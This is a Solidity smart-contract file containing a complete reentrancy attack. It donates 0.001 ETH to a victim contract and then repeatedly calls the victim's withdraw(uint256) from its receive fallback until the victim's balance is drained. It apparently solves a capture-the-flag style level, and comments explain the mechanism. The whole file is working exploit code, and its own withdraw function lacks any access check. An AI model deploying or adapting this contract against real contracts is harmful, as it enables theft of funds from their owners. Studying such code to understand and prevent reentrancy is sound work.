// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract AttackReentrancy {
    address payable victim;
    uint256 targetAmount = 0.001 ether;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function donate() public payable {
        require(
            msg.value == targetAmount,
            "Please call donate with 0.001 ETH."
        );
        bytes memory payload = abi.encodeWithSignature(
            "donate(address)",
            address(this)
        );
        (bool success, ) = victim.call{value: targetAmount}(payload);
        require(
            success,
            "Transaction call using encodeWithSignature is successful"
        );
    }

    function maliciousWithdraw() public {
        bytes memory payload = abi.encodeWithSignature(
            "withdraw(uint256)",
            targetAmount
        );
        victim.call(payload);
    }

    receive() external payable {
        // This attack contract has a malicious receive fallback function
        // that calls maliciousWithdraw again which calls withdraw!
        // This is how the reentrancy attack works.
        uint256 balance = victim.balance;
        if (balance >= targetAmount) {
            maliciousWithdraw();
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
